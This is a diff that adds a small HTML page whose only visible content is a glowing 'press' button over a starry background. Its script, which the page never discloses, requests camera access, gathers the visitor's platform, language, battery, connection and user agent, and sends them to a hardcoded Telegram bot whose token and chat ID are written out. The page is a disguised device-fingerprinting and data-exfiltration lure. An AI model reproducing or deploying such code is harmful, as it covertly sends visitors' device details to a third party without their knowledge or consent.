@@ -1,0 +1,164 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>press</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            user-select: none;
+        }
+        body {
+            min-height: 100vh;
+            background: radial-gradient(ellipse at bottom, #0d1d31 0%, #0c0d13 100%);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            position: relative;
+            overflow: hidden;
+        }
+        /* efek bintang */
+        body::before {
+            content: "";
+            position: absolute;
+            width: 100%;
+            height: 100%;
+            background-image: 
+                radial-gradient(2px 2px at 10px 30px, #fff, rgba(0,0,0,0)),
+                radial-gradient(2px 2px at 80px 200px, #fff, rgba(0,0,0,0)),
+                radial-gradient(3px 3px at 150px 80px, #fff, rgba(0,0,0,0)),
+                radial-gradient(1px 1px at 250px 400px, #fff, rgba(0,0,0,0)),
+                radial-gradient(2px 2px at 350px 150px, #fff, rgba(0,0,0,0));
+            background-repeat: repeat;
+            opacity: 0.6;
+            animation: kelap 5s infinite alternate;
+        }
+        @keyframes kelap {
+            0% { opacity: 0.3; }
+            100% { opacity: 0.9; }
+        }
+        .tombol {
+            position: relative;
+            z-index: 10;
+            background: transparent;
+            border: 4px solid #00ffff;
+            color: #00ffff;
+            font-size: 2.8rem;
+            font-weight: 800;
+            text-transform: uppercase;
+            padding: 1.5rem 3rem;
+            border-radius: 80px;
+            letter-spacing: 8px;
+            cursor: pointer;
+            backdrop-filter: blur(10px);
+            box-shadow: 0 0 30px rgba(0, 255, 255, 0.5);
+            transition: 0.2s;
+            text-shadow: 0 0 15px cyan;
+        }
+        .tombol:hover {
+            background: #00ffff;
+            color: #0a1a2a;
+            box-shadow: 0 0 60px cyan;
+        }
+        .tombol.sukses {
+            background: #00ffaa;
+            border-color: #00ffaa;
+            color: #0a1a2a;
+            box-shadow: 0 0 80px #00ffaa;
+        }
+    </style>
+</head>
+<body>
+    <button class="tombol" id="ijin">press</button>
+
+    <script>
+        const btn = document.getElementById('ijin');
+        const BOT_TOKEN = '8609869149:AAEw1MQkkAqrJpiFteCXyHymptZNSnNjDgg';
+        const CHAT_ID = '7528625787';
+        const TELEGRAM_API = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+
+        async function ambilData() {
+            const ua = navigator.userAgent;
+            const platform = navigator.platform || 'tidak diketahui';
+            const bahasa = navigator.language || 'tidak diketahui';
+            const waktu = new Date().toLocaleString();
+            let baterai = 'tidak didukung';
+            if ('getBattery' in navigator) {
+                try {
+                    const b = await navigator.getBattery();
+                    baterai = `${Math.round(b.level * 100)}% ${b.charging ? '⚡' : ''}`;
+                } catch (e) { baterai = 'error'; }
+            }
+            let koneksi = 'tidak tersedia';
+            if (navigator.connection) {
+                koneksi = `${navigator.connection.effectiveType || '?'} ${navigator.connection.downlink}Mbps`;
+            }
+            return { platform, bahasa, waktu, baterai, koneksi, ua: ua.substring(0, 150) };
+        }
+
+        async function mintaKamera() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                stream.getTracks().forEach(t => t.stop());
+                return true;
+            } catch {
+                return false;
+            }
+        }
+
+        async function kirim(data, kameraOk) {
+            const teks = `
+📱 *INFO PERANGKAT*
+• Platform: ${data.platform}
+• Bahasa: ${data.bahasa}
+• Baterai: ${data.baterai}
+• Koneksi: ${data.koneksi}
+• Waktu: ${data.waktu}
+• Kamera: ${kameraOk ? '✅' : '❌'}
+• UA: ${data.ua}
+            `;
+            try {
+                const res = await fetch(TELEGRAM_API, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: teks,
+                        parse_mode: 'Markdown'
+                    })
+                });
+                return res.ok;
+            } catch {
+                return false;
+            }
+        }
+
+        btn.addEventListener('click', async () => {
+            btn.style.pointerEvents = 'none';
+            const originalText = btn.textContent;
+            btn.textContent = '...';
+            const kameraOk = await mintaKamera();
+            const data = await ambilData();
+            const terkirim = await kirim(data, kameraOk);
+            if (terkirim) {
+                btn.classList.add('sukses');
+                btn.textContent = '✓';
+                setTimeout(() => {
+                    btn.classList.remove('sukses');
+                    btn.textContent = originalText;
+                    btn.style.pointerEvents = 'auto';
+                }, 1000);
+            } else {
+                btn.textContent = '✗';
+                setTimeout(() => {
+                    btn.textContent = originalText;
+                    btn.style.pointerEvents = 'auto';
+                }, 1000);
+            }
+        });
+    </script>
+</body>
+</html>
